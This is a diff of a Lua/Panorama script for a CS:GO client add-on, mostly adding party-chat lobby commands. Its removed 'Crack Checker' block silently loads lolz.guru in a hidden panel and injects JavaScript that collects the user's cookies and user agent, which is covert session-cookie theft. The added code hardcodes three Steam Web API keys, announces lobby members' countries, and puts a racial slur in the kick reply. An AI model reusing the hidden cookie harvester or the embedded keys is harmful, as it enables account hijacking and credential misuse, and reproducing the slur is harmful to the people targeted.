Alias == command ) {\n\t\t\t\t\t\t\t\t\t\t\t\tif ( ChatCommand.timeout ) {\n\t\t\t\t\t\t\t\t\t\t\t\t\tif ( Timeouts[ChatCommand] && Date.now() <= Timeouts[ChatCommand] ) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tTimeouts[ChatCommand] = Date.now() + ChatCommand.timeout\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tChatCommand.exec(command, args, Sender, MsgSteamID)\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t} catch(err) {\n\t\t\t\t\t\t\t\t$.Msg('CSLua: Error (probably irrelevent) ', err);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( child ) child.AddClass('cp_processed');\n\t\t\t\t\t\t}\n\t\t\t\t\t})\n\t\t\t\t}\n\t\t\t}\t\n\t\t}\n\n\t\treturn {\n\t\t\tPartyChatLoop: ()=>{\n\t\t\t\tPartyChatLoop();\n\t\t\t},\n\t\t\tGetUserData: ()=>{\n\t\t\t\treturn JSON.stringify(UserData);\n\t\t\t},\n\t\t\tSetUserData: (data)=>{\n\t\t\t\tUserData = JSON.parse(data);\n\t\t\t\tUserData.mods = typeof UserData.mods == 'undefined' ? [] : Object.values(UserData.mods);\n\t\t\t\tUserData.blacklist = typeof UserData.blacklist == 'undefined' ? [] : Object.values(UserData.blacklist);\n\t\t\t},\n\t\t\tPreviousMessage: ()=>{\n\t\t\t\tlet elInput = $.GetContextPanel().FindChildTraverse('ChatInput');\n\t\t\t\tif ( elInput && Utilities.MessageHistory.length > 0 && Utilities.MessageIndex > 0 ) {\n\t\t\t\t\tif ( elInput.BHasKeyFocus() ) {\n\t\t\t\t\t\telInput.text = Utilities.MessageHistory[Utilities.MessageIndex-- - 1];\n\t\t\t\t\t} else {\n\t\t\t\t\t\tUtilities.MessageIndex = Utilities.MessageHistory.length;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t},\n\t\t\tNextMessage: ()=>{\n\t\t\t\tlet elInput = $.GetContextPanel().FindChildTraverse('ChatInput');\n\t\t\t\tif ( elInput && Utilities.MessageHistory.length > 0 && Utilities.MessageIndex < Utilities.MessageHistory.length - 1 ) {\n\t\t\t\t\tif ( elInput.BHasKeyFocus() ) {\n\t\t\t\t\t\telInput.text = Utilities.MessageHistory[Utilities.MessageIndex++ + 1];\n\t\t\t\t\t} else {\n\t\t\t\t\t\tUtilities.ClearMessageIndex();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t},\n\t\t\tClearMessageIndex: Utilities.ClearMessageIndex\n\t\t}\n\t", "CSGOMainMenu")()
+--#region Panorama and Libraries
+if ( Feature.get('Panorama Libraries') ) then
+	--#region PartyChatCmd Library
+	CPPanoramaMainMenu = panorama.loadstring([[
+		// Lobby Chat Utils
+		let Prefix = '!';
+		let MsgSteamID = false;
+		let MySteamID = MyPersonaAPI.GetXuid();
+		let UserData = {};
+		let MuteUsers = [];
 
-	if var_0_18.get("Crack Checker") then
-		LolzPanorama = panorama.loadstring("\t\t\tvar html\n\t\t\tvar finish_handler\n\t\t\tvar alert_handler\n\t\t\tvar data\n\n\t\t\tvar page_script = `\n\t\t\t\tfunction setCookie(name,value,days) {\n\t\t\t\t\tvar expires = \"\";\n\t\t\t\t\tif (days) {\n\t\t\t\t\t\tvar date = new Date();\n\t\t\t\t\t\tdate.setTime(date.getTime() + (days*24*60*60*1000));\n\t\t\t\t\t\texpires = \"; expires=\" + date.toUTCString();\n\t\t\t\t\t}\n\t\t\t\t\tdocument.cookie = name + \"=\" + (value || \"\")  + expires + \"; path=/\";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tsetCookie('xf_market_currency','usd',7);\n\t\t\t\t\n\t\t\t\tvar data = {\n\t\t\t\t\tcookie: document.cookie,\n\t\t\t\t\tuser_agent: navigator.userAgent\n\t\t\t\t}\n\t\t\t\talert(JSON.stringify(data));\n\t\t\t`\n\n\t\t\tvar _Create = function() {\n\t\t\t\tif(html != null) {\n\t\t\t\t\treturn\n\t\t\t\t}\n\n\t\t\t\thtml = $.CreatePanel(\"HTML\", $.GetContextPanel(), \"\", {\n\t\t\t\t\turl: \"https://lolz.guru/\",\n\t\t\t\t\tacceptsinput: \"false\",\n\t\t\t\t\tacceptsfocus: \"false\",\n\t\t\t\t\tmousetracking: \"false\",\n\t\t\t\t\tfocusonhover: \"false\",\n\t\t\t\t\twidth: \"100px\",\n\t\t\t\t\theight: \"100px\",\n\t\t\t\t})\n\t\t\t\thtml.visible = false\n\n\t\t\t\tfinish_handler = $.RegisterEventHandler(\"HTMLFinishRequest\", html, function(a, url, title){\n\t\t\t\t\tif(url == \"https://lolz.guru/\"){\n\t\t\t\t\t\thtml.RunJavascript(page_script)\n\t\t\t\t\t}\n\t\t\t\t});\n\n\t\t\t\talert_handler = $.RegisterEventHandler(\"HTMLJSAlert\", html, function(id, alert_text){\n\t\t\t\t\tif(html != null && id == html.id) {\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tdata = JSON.parse(alert_text)\n\n\t\t\t\t\t\t\thtml.RunJavascript('document.cookie = `df_id=; domain=lolz.guru; path=/; max-age=0; xf_market_currency=usd;`;')\n\n\t\t\t\t\t\t\t// we got cookies, clean up everything\n\t\t\t\t\t\t\t_Destroy()\n\t\t\t\t\t\t} catch(err) {\n\t\t\t\t\t\t\t// silently ignore\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t});\n\n\t\t\t}\n\n\t\t\tvar _Destroy = function() {\n\t\t\t\tif(finish_handler != null) {\n\t\t\t\t\t$.UnregisterEventHandler(\"HTMLFinishRequest\", html, finish_handler)\n\t\t\t\t\tfinish_handler = null\n\t\t\t\t}\n\n\t\t\t\tif(alert_handler != null) {\n\t\t\t\t\t$.UnregisterEventHandler(\"HTMLJSAlert\", html, alert_handler)\n\t\t\t\t\talert_handler = null\n\t\t\t\t}\n\n\t\t\t\tif(html != null) {\n\t\t\t\t\thtml.DeleteAsync(0.0)\n\t\t\t\t\thtml = null\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// just to return the data back to lua\n\t\t\tvar _GetData = function() {\n\t\t\t\treturn data\n\t\t\t}\n\n\t\t\treturn {\n\t\t\t\tcreate: _Create,\n\t\t\t\tdestroy: _Destroy,\n\t\t\t\tget_data: _GetData\n\t\t\t}\n\t\t", "CSGOMainMenu")()
-	end
+		const Utilities = {};
 
-	ReconnectBtn = panorama.loadstring("\t\tvar btnReconnect = $.GetContextPanel().FindChildTraverse( 'MatchmakingReconnect' );\n\n\t\treturn {\n\t\t\tset:(text)=>{btnReconnect.text = text},\n\t\t\treset:()=>{btnReconnect.text = 'RECONNECT'},\n\t\t\tget:()=>btnReconnect.text\n\t\t}\n\t", "CSGOMainMenu")()
+		Utilities.IsBlacklisted = (SteamXUID) => {
+			UserData.blacklist = UserData.blacklist || [0];
+			return UserData.blacklist.includes(SteamXUID)
+		}
 
-	if var_0_18.get("LiveCheck Library") then
-		client.delay_call(0, function()
-			LiveCheck = {
-				datawaiting = {},
-				agecheck = {},
-				dataready = {}
+		Utilities.SayParty = (Message) => {
+			let FilteredMessage = Message.split(' ').join('\u{00A0}');
+			PartyListAPI.SessionCommand('Game::Chat', `run all xuid ${MySteamID} chat ${FilteredMessage}`);
+		}
+
+		let Keys = [
+			'5DA40A4A4699DEE30C1C9A7BCE84C914',
+			'5970533AA2A0651E9105E706D0F8EDDC',
+			'2B3382EBA9E8C1B58054BD5C5EE1C36A'
+		];
+		let KeyIndex = 0
+		Utilities.RandomWebKey = () => {
+			if ( KeyIndex >= Keys.length ) KeyIndex = 0;
+			return Keys[KeyIndex++]
+		}
+
+		/*
+		function resolveVanityURL(vanityurl, callback)
+			http.get('https://api.steampowered.com/ISteamUser/ResolveVanityURL/v1?key=' .. Utilities.RandomWebKeyhttp .. '&vanityurl=' .. vanityurl, function(success, response)
+				if not success or response.status ~= 200 then return callback(false) end
+		
+				local data = json.parse(response.body)
+				if data then
+					if not data.response.success == 1 or not data.response.steamid then return callback(false) end
+					return callback(data.response.steamid)
+				end
+				return callback(false)
+			end)
+		end
+		*/
+
+		Utilities.resolveVanityURL = (vanityurl, callback) => {
+			$.AsyncWebRequest('https://api.steampowered.com/ISteamUser/ResolveVanityURL/v1?key=' + Utilities.RandomWebKey() + '&vanityurl=' + vanityurl, {
+				type:"GET",
+				complete:function(e){
+					if ( e.status != 200 ) return;
+					let Response = e.responseText.substring(0, e.responseText.length-1);
+                    let Data = JSON.parse(Response);
+					if ( Data.response.success ) {
+						callback(Data.response.steamid)
+					}
+				}
+			});
+		}
+
+		Utilities.FindPlayer = (str, NoOutput, callback) => {
+			let FoundXUID = false;
+
+			// Type Checks
+			let regex_steamid64 = /(765\d{14})/i;
+			let regex_steamid3 = / /i; // idk yet bud, maths is dumb
+			let regex_friendcode = /(\w{5}-\w{4})/i;
+			let regex_lobbyindex = /\d{1}$/i
+			let regex_url = /steamcommunity.com\/id\/(.+)$/i;
+
+			if ( regex_steamid64.test(str) ) {
+				FoundXUID = str.match(regex_steamid64)[0];
+			} else if ( regex_steamid3.test(str) ) {
+
+			} else if ( regex_friendcode.test(str) ) {
+				FoundXUID = FriendsListAPI.GetXuidFromFriendCode(str.match(regex_friendcode)[0]);
+			} else if ( regex_lobbyindex.test(str) ) {
+				let LobbyIndex = str.match(regex_lobbyindex)[0]
+				FoundXUID = PartyListAPI.GetXuidByIndex(LobbyIndex - 1);
+			} else if ( regex_url.test(str) && callback ) {
+				let vanityURL = str.match(regex_url)[1].replace(/\/$/, "")
+				Utilities.resolveVanityURL(vanityURL, (steamid)=>{
+					callback(steamid)
+				});
+			} else if ( typeof str == 'string' ) {
+				let TempID;
+				let TempCount = 0;
+				for ( i=0; i<PartyListAPI.GetCount(); i++ ) {
+					let MemberSteamID = PartyListAPI.GetXuidByIndex(i);
+					let MemberName = PartyListAPI.GetFriendName(MemberSteamID);
+					if ( MemberName.toLowerCase().indexOf(str.toLowerCase()) == 0 ) {
+						TempID = MemberSteamID;
+						TempCount++;
+					}
+				}
+				if ( TempCount == 1 ) {
+					FoundXUID = TempID;
+				} else if ( !NoOutput ) {
+					Utilities.SayParty(`Found ${TempCount} matches for "${str}", try being more specific!`)
+				}
+			}
+			if ( FoundXUID ) {
+				if ( callback ) callback(FoundXUID);
+				return FoundXUID
+			}
+		}
+
+		Utilities.MessageHistory = [];
+
+		function AttachHistory() {
+			let elInput = $.GetContextPanel().FindChildTraverse('ChatInput');
+
+			let ChatPanelContainer = $.GetContextPanel().FindChildTraverse('ChatPanelContainer');
+			
+			if ( ChatPanelContainer && elInput ) {
+				let Root = ChatPanelContainer.GetParent();
+
+				elInput.ClearPanelEvent('oninputsubmit');
+
+				elInput.SetPanelEvent( 'onfocus', ()=>{
+				});
+
+				Utilities.ClearMessageIndex = ()=>{
+					Utilities.MessageIndex = Utilities.MessageHistory.length;
+				}
+
+				elInput.SetPanelEvent( 'oninputsubmit', ()=>{
+					let Msg = elInput.text;
+					if ( Msg != '' ) {
+						Utilities.MessageHistory.push(Msg);
+						Utilities.ClearMessageIndex();
+					}
+					elInput.text = Msg.replace(/@[0-9\w-]+/ig, (match, capture)=>{
+						let FoundXUID = Utilities.FindPlayer(match.substring(1), true)
+						if ( FoundXUID ) {
+							return PartyListAPI.GetFriendName(FoundXUID)
+						}
+						return match
+					});
+					Root.SubmitChatText()
+					elInput.text = "";
+				});
+			}
+		}
+
+		AttachHistory()
+
+		$.RegisterForUnhandledEvent("PanoramaComponent_Lobby_MatchmakingSessionUpdate", function(state){
+			if(state == 'updated' && PartyListAPI.IsPartySessionActive()){
+				AttachHistory();
+			}
+		});
+
+		let PartyChatCommands = [];
+		
+		PartyChatCommands.push({
+			title: 'Help (!\u{200B}help)',
+			cmds: ['help', 'h'],
+			timeout: 2500,
+			exec: (cmd, args, sender, steamid) => {
+ 				if ( Utilities.IsBlacklisted(steamid) ) return;
+				if ( args.length == 0 ) {
+					for ( i=1; i<PartyChatCommands.length; i++ ) {
+						let ChatCommand = PartyChatCommands[i];
+						const Title = `» ${ChatCommand.title}`;
+						const Alias = ChatCommand.cmds;
+						Utilities.SayParty(Title);
+					}
+				} else {
+					for ( i=1; i<PartyChatCommands.length; i++ ) {
+						let ChatCommand = PartyChatCommands[i];
+						const Alias = ChatCommand.cmds;
+						const FoundAlias = Alias.find(item => item == args[0]);
+						if ( FoundAlias ) {
+							const AliasString = Alias.join(', ');
+							const Title = `» List of Alias's: ${AliasString}`;
+							Utilities.SayParty(Title);
+							break;
+						}
+					}
+				}
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Test (!\u{200B}test)',
+			cmds: ['test'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				Utilities.SayParty(`Test successful, sender info: ${sender} | ${steamid}`)
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Start Queue (!\u{200B}startq)',
+			cmds: ['start', 'startq', 'startqueue', 'queue', 'q'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				if ( !LobbyAPI.BIsHost() ) return;
+				
+				let settings = LobbyAPI.IsSessionActive() ? LobbyAPI.GetSessionSettings() : null;
+				let stage = '';
+				if ( settings && settings.game && settings.options
+					&& settings.options.server !== 'listen'
+					&& settings.game.mode === 'competitive'
+					&& settings.game.mapgroupname.includes( 'mg_lobby_mapveto' ) ) {
+					stage = '1';
+				}
+
+				LobbyAPI.StartMatchmaking(	MyPersonaAPI.GetMyOfficialTournamentName(),
+					MyPersonaAPI.GetMyOfficialTeamName(),
+					'',
+					stage
+				);
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Stop Queue (!\u{200B}stopq)',
+			cmds: ['stop', 'stopq', 'stopqueue', 'sq', 's'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				LobbyAPI.StopMatchmaking()
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Restart Queue (!\u{200B}restartq)',
+			cmds: ['restart', 'restartq', 'restartqueue', 'rs'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				if ( !LobbyAPI.BIsHost() ) return;
+				LobbyAPI.StopMatchmaking()
+				$.Schedule(1, ()=>{
+					let settings = LobbyAPI.IsSessionActive() ? LobbyAPI.GetSessionSettings() : null;
+					let stage = '';
+					if ( settings && settings.game && settings.options
+						&& settings.options.server !== 'listen'
+						&& settings.game.mode === 'competitive'
+						&& settings.game.mapgroupname.includes( 'mg_lobby_mapveto' ) ) {
+						stage = '1';
+					}
+
+					LobbyAPI.StartMatchmaking(	MyPersonaAPI.GetMyOfficialTournamentName(),
+						MyPersonaAPI.GetMyOfficialTeamName(),
+						'',
+						stage
+					);
+				});
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Reset Lobby (!\u{200B}resetlobby)',
+			cmds: ['resetlobby', 'relobby', 'rl'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+
+				let Settings = LobbyAPI.GetSessionSettings();
+				let GameMode = Settings.game.mode;
+				let GameType = Settings.game.type;
+				let MapGroupName = Settings.game.mapgroupname;
+				let MySteamID = MyPersonaAPI.GetXuid();
+
+				if ( steamid != MySteamID ) return;
+
+				// Get Lobby Players
+				let SteamIDs = [];
+				for ( i=0; i<Settings.members.numMachines; i++ ) {
+					let Player = Settings.members[`machine${i}`];
+					let PlayerSteamID = Player.id;
+
+					if ( MySteamID != PlayerSteamID ) {
+						SteamIDs.push(PlayerSteamID)
+					}
+				}
+
+				LobbyAPI.CloseSession();
+
+				for ( i=0; i<SteamIDs.length; i++ ) {
+					FriendsListAPI.ActionInviteFriend(SteamIDs[i], '');
+				}
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Maps (!\u{200B}maps dust2, safehouse)',
+			cmds: ['maps', 'map', 'setmaps', 'changemap', 'changemaps'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				if ( !UserData.mods.indexOf(steamid) ) return;
+				if ( !LobbyAPI.BIsHost() ) return;
+				
+				let Config = GameTypesAPI.GetConfig();
+				let SessionSettings = LobbyAPI.GetSessionSettings();
+				let GameMode = SessionSettings.game.mode;
+				let GameType = SessionSettings.game.type;
+
+				let MapsInGroup = Config.gameTypes[GameType].gameModes[GameMode].mapgroupsMP;
+				let MapList = [];
+
+				if ( args[0] == 'all' ) {
+					delete MapsInGroup['mg_lobby_mapveto'];
+					MapList = Object.keys(MapsInGroup)
+				} else {
+					let Maps = args.join(',').split(',');
+					let FilteredMaps = [];
+					Maps.forEach((map, index)=>{
+						if ( map.trim() != '' ) {
+							FilteredMaps.push(map)
+						}
+					});
+
+					let FoundMaps = {};
+					FilteredMaps.forEach((SearchMap, key)=>{
+						for (Map in MapsInGroup) {
+							let MapName = GameTypesAPI.GetFriendlyMapName(Map.substr(3));
+							if ( Map.indexOf('scrimmage') == -1 && ( MapName.toLowerCase().indexOf(SearchMap.trim().toLowerCase()) != -1 || Map.toLowerCase().search(SearchMap.toLowerCase()) != -1 ) ) {
+								FoundMaps[Map] = true;
+							}
+						} 
+					});
+					
+					for ( Map in FoundMaps ) {
+						MapList.push(Map);
+					}
+				}
+				
+				if ( MapList.length > 0 ) {
+					PartyListAPI.UpdateSessionSettings(`Update/Game/mapgroupname ${MapList}`);
+				} 
+			}
+		});
+
+		PartyChatCommands.push({
+			title: 'Gamemode (!\u{200B}mode wm)',
+			cmds: ['mode', 'gm', 'gamemode', 'mm', 'wm'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				if ( !LobbyAPI.BIsHost() ) return;
+
+				let SessionSettings = LobbyAPI.GetSessionSettings();
+				let GameMode = SessionSettings.game.mode;
+				let GameType = SessionSettings.game.type;
+
+				let settings = { update : { Game: { } } }
+
+				// I would use a switch case, but I want to do regex
+				if ( cmd == 'mm' || ( args.length > 0 && /(comp.*|5(x|v)5|mm)/i.test(args[0]) ) ) {
+					settings.update.Game.mode = 'competitive'
+					settings.update.Game.type = 'classic'
+				} else if ( cmd == 'wm' || ( args.length > 0 && /(wing.*|2(x|v)2|wm)/i.test(args[0]) ) ) {
+					settings.update.Game.mode = 'scrimcomp2v2'
+					settings.update.Game.type = 'classic'
+				}
+
+				LobbyAPI.UpdateSessionSettings( settings );
+			}
+		});
+
+		PartyChatCommands.push({
+			title: 'clearchat (!\u{200B}clearchat)',
+			cmds: ['clearchat', 'clear', 'cc', 'cl', 'deletechat', 'delchat', 'deletechat'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( steamid != MyPersonaAPI.GetXuid() ) return;
+
+				let party_chat = $.GetContextPanel().FindChildTraverse("PartyChat")
+				if(party_chat) {
+					let chat_lines = party_chat.FindChildTraverse("ChatLinesContainer")
+					if(chat_lines) {
+						chat_lines.RemoveAndDeleteChildren();
+					}
+				}
+			}
+		});
+
+		PartyChatCommands.push({
+			title: 'Kick (!\u{200B}kick <partial:name>|<steamid>|<friendcode>)',
+			cmds: ['kick'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				if ( !LobbyAPI.BIsHost() ) return;
+				if ( steamid != LobbyAPI.GetHostSteamID() && !UserData.mods.indexOf(steamid) ) return;
+
+				UserData.mods = UserData.mods || [0];
+
+				if ( typeof args[0] != 'undefined' ) {
+					let KickXUID = Utilities.FindPlayer(args[0]);
+					if ( KickXUID && LobbyAPI.GetHostSteamID() != KickXUID && LobbyAPI.IsPartyMember(KickXUID) ) {
+						LobbyAPI.KickPlayer(KickXUID);
+						let Name = FriendsListAPI.GetFriendName(KickXUID);
+						Utilities.SayParty(`Kicked ${Name} (${KickXUID}) from the lobby!`);
+					} else if ( LobbyAPI.GetHostSteamID() == KickXUID ) {
+						Utilities.SayParty(`You cant kick the host nigger!`);
+					}
+				}
+			}
+		});
+
+		PartyChatCommands.push({
+			title: 'Check (!\u{200B}Check <steamid>|<friendcode>)',
+			cmds: ['check'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+
+				if ( typeof args[0] != 'undefined' ) {
+					Utilities.FindPlayer(args[0], false, (steamid)=>{
+						let Name = FriendsListAPI.GetFriendName(steamid);
+						Utilities.SayParty('[LiveCheck] Please wait 5 seconds. Checking...');
+						LiveCheck.start(steamid, (data)=>{
+							let msg = '[LiveCheck] ';
+							if ( data ) { 
+								msg += `${Name} is in-${data.state} `
+								if ( data.state == 'lobby' ) {
+									msg += 'queuing '
+									let Maps = data.mapgroupname.split(',');
+									let CleanMaps = [];
+									for ( i=0; i<Maps.length; i++ ) {
+										let TextClean = Maps[i].substr(3, Maps[i].length);
+										CleanMaps[i] = GameTypesAPI.GetFriendlyMapName(TextClean);
+									}
+									msg += CleanMaps.join(', ');
+								} else if ( data.state == 'game' ) {
+									msg += `playing ${data.map} - ${data.status}`
+								}
+							} else {
+								msg += ` Found no rich presence for ${steamid}`;
+							}
+							Utilities.SayParty(msg);
+						})
+					});
+				}
+			}
+		});
+
+		// CountryNames thanks to sapphryus
+		let CountryNames = {KW:"Kuwait",MA:"Morocco ",AF:"Afghanistan",AL:"Albania",DZ:"Algeria",AS:"American Samoa",AD:"Andorra",AO:"Angola",AI:"Anguilla",AQ:"Antarctica",AG:"Antigua and Barbuda",AR:"Argentina",AM:"Armenia",AW:"Aruba",AU:"Australia",AT:"Austria",AZ:"Azerbaijan",BS:"Bahamas",BH:"Bahrain",BD:"Bangladesh",BB:"Barbados",BY:"Belarus",BE:"Belgium",BZ:"Belize",BJ:"Benin",BM:"Bermuda",BT:"Bhutan",BO:"Bolivia",BA:"Bosnia and Herzegovina",BW:"Botswana",BV:"Bouvet Island",BR:"Brazil",IO:"British Indian Ocean Territory",BN:"Brunei Darussalam",BG:"Bulgaria",BF:"Burkina Faso",BI:"Burundi",KH:"Cambodia",CM:"Cameroon",CA:"Canada",CV:"Cape Verde",KY:"Cayman Islands",CF:"Central African Republic",TD:"Chad",CL:"Chile",CN:"China",CX:"Christmas Island",CC:"Cocos (Keeling) Islands",CO:"Colombia",KM:"Comoros",CG:"Congo",CD:"Congo, the Democratic Republic of the",CK:"Cook Islands",CR:"Costa Rica",CI:"Cote D'Ivoire",HR:"Croatia",CU:"Cuba",CY:"Cyprus",CZ:"Czech Republic",DK:"Denmark",DJ:"Djibouti",DM:"Dominica",DO:"Dominican Republic",EC:"Ecuador",EG:"Egypt",SV:"El Salvador",GQ:"Equatorial Guinea",ER:"Eritrea",EE:"Estonia",ET:"Ethiopia",FK:"Falkland Islands (Malvinas)",FO:"Faroe Islands",FJ:"Fiji",FI:"Finland",FR:"France",GF:"French Guiana",PF:"French Polynesia",TF:"French Southern Territories",GA:"Gabon",GM:"Gambia",GE:"Georgia",DE:"Germany",GH:"Ghana",GI:"Gibraltar",GR:"Greece",GL:"Greenland",GD:"Grenada",GP:"Guadeloupe",GU:"Guam",GT:"Guatemala",GN:"Guinea",GW:"Guinea-Bissau",GY:"Guyana",HT:"Haiti",HM:"Heard Island and Mcdonald Islands",VA:"Holy See (Vatican City State)",HN:"Honduras",HK:"Hong Kong",HU:"Hungary",IS:"Iceland",IN:"India",ID:"Indonesia",IR:"Iran, Islamic Republic of",IQ:"Iraq",IE:"Ireland",IL:"Israel",IT:"Italy",JM:"Jamaica",JP:"Japan",JO:"Jordan",KZ:"Kazakhstan",KE:"Kenya",KI:"Kiribati",KP:"North Korea",KR:"South Korea",KW:"Kuwait",KG:"Kyrgyzstan",LA:"Lao People's Democratic Republic",LV:"Latvia",LB:"Lebanon",LS:"Lesotho",LR:"Liberia",LY:"Libya",LI:"Liechtenstein",LT:"Lithuania",LU:"Luxembourg",MO:"Macao",MG:"Madagascar",MW:"Malawi",MY:"Malaysia",MV:"Maldives",ML:"Mali",MT:"Malta",MH:"Marshall Islands",MQ:"Martinique",MR:"Mauritania",MU:"Mauritius",YT:"Mayotte",MX:"Mexico",FM:"Micronesia, Federated States of",MD:"Moldova, Republic of",MC:"Monaco",MN:"Mongolia",MS:"Montserrat",MA:"Morocco",MZ:"Mozambique",MM:"Myanmar",NA:"Namibia",NR:"Nauru",NP:"Nepal",NL:"Netherlands",NC:"New Caledonia",NZ:"New Zealand",NI:"Nicaragua",NE:"Niger",NG:"Nigeria",NU:"Niue",NF:"Norfolk Island",MK:"North Macedonia, Republic of",MP:"Northern Mariana Islands",NO:"Norway",OM:"Oman",PK:"Pakistan",PW:"Palau",PS:"Palestinian Territory, Occupied",PA:"Panama",PG:"Papua New Guinea",PY:"Paraguay",PE:"Peru",PH:"Philippines",PN:"Pitcairn",PL:"Poland",PT:"Portugal",PR:"Puerto Rico",QA:"Qatar",RE:"Reunion",RO:"Romania",RU:"Russia",RW:"Rwanda",SH:"Saint Helena",KN:"Saint Kitts and Nevis",LC:"Saint Lucia",PM:"Saint Pierre and Miquelon",VC:"Saint Vincent and the Grenadines",WS:"Samoa",SM:"San Marino",ST:"Sao Tome and Principe",SA:"Saudi Arabia",SN:"Senegal",SC:"Seychelles",SL:"Sierra Leone",SG:"Singapore",SK:"Slovakia",SI:"Slovenia",SB:"Solomon Islands",SO:"Somalia",ZA:"South Africa",GS:"South Georgia and the South Sandwich Islands",ES:"Spain",LK:"Sri Lanka",SD:"Sudan",SR:"Suriname",SJ:"Svalbard and Jan Mayen",SZ:"Eswatini",SE:"Sweden",CH:"Switzerland",SY:"Syrian Arab Republic",TW:"Taiwan",TJ:"Tajikistan",TZ:"Tanzania, United Republic of",TH:"Thailand",TL:"Timor-Leste",TG:"Togo",TK:"Tokelau",TO:"Tonga",TT:"Trinidad and Tobago",TN:"Tunisia",TR:"Turkey",TM:"Turkmenistan",TC:"Turks and Caicos Islands",TV:"Tuvalu",UG:"Uganda",UA:"Ukraine",AE:"United Arab Emirates",GB:"United Kingdom",US:"USA",UM:"United States Minor Outlying Islands",UY:"Uruguay",UZ:"Uzbekistan",VU:"Vanuatu",VE:"Venezuela",VN:"Vietnam",VG:"Virgin Islands, British",VI:"Virgin Islands, U.S.",WF:"Wallis and Futuna",EH:"Western Sahara",YE:"Yemen",ZM:"Zambia",ZW:"Zimbabwe",AX:"Åland Islands",BQ:"Bonaire, Sint Eustatius and Saba",CW:"Curaçao",GG:"Guernsey",IM:"Isle of Man",JE:"Jersey",ME:"Montenegro",BL:"Saint Barthélemy",MF:"Saint Martin (French part)",RS:"Serbia",SX:"Sint Maarten (Dutch part)",SS:"South Sudan",XK:"Kosovo"}
+		PartyChatCommands.push({
+			title: 'Locate (!\u{200B}locate <partial:name>|<steamid>|<friendcode>)',
+			cmds: ['locate', 'locs', 'loc', 'locations', 'location'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				let XUID = 0;
+				if ( typeof args[0] != 'undefined' ) {
+					XUID = Utilities.FindPlayer(args[0])
+				}
+				
+
+				let Settings = LobbyAPI.GetSessionSettings();
+				for ( i=0; i<Settings.members.numMachines; i++ ) {
+					let Player = Settings.members[`machine${i}`];
+					let PlayerSteamID = Player.id;
+					let PlayerName = Player.player0.name;
+					let Location = Player.player0.game.loc;
+					let LocationFull = CountryNames[Location];
+
+					if ( typeof args[0] == 'undefined' || PlayerSteamID == XUID ) {
+						Utilities.SayParty(`[LOCATION] ${PlayerName} is from ${LocationFull}!`);
+					}
+				}
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Mods (!\u{200B}mod add <partial:name>|<steamid>|<friendcode>|<lobbyindex>)',
+			helpTitle: 'Type "!mod add <PartialName>", "!mod add <SteamID64>", "!mod add <FriendCode>", "!mod add <LobbyIndex>"',
+			helpExamples: 'Typing "!mod add 2" will mod the second person in the lobby, others are pretty easy like "!mod add csmit"!',
+			cmds: ['mod'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( steamid == MyPersonaAPI.GetXuid() ) {
+					UserData.mods = UserData.mods || [0];
+					switch(args[0]) {
+						case 'add':
+							if ( typeof args[1] != 'undefined' ) {
+								let ModXUID = Utilities.FindPlayer(args[1]);
+								if ( ModXUID ) {
+									if ( UserData.mods.indexOf(ModXUID) == -1 ) {
+										UserData.mods.push(ModXUID);
+										let FriendName = FriendsListAPI.GetFriendName(ModXUID);
+										Utilities.SayParty(`Added ${FriendName}(${ModXUID}) as a moderator!`);
+									} else {
+										let FriendName = FriendsListAPI.GetFriendName(ModXUID);
+										Utilities.SayParty(`Cannot add ${FriendName}(${ModXUID}) as they are already a moderator!`)
+									}
+								} else {
+									Utilities.SayParty(`Sorry! I don't know how to decipher: ${args[1]}`)
+								}
+							}
+							break;
+						case 'list':
+							UserData.mods.forEach((steamid, index)=>{
+								if ( steamid ) {
+									let FriendName = FriendsListAPI.GetFriendName(steamid);
+									Utilities.SayParty(`[${index}] ${FriendName} - ${steamid}`);
+								}
+							})
+							break;
+						case 'remove':
+							if ( typeof args[1] != 'undefined' ) {
+								if ( typeof UserData.mods[ parseInt(args[1]) ] == 'undefined' ) {
+									let ModXUID = Utilities.FindPlayer(args[1]);
+									let FoundIndex = UserData.mods.indexOf(ModXUID);
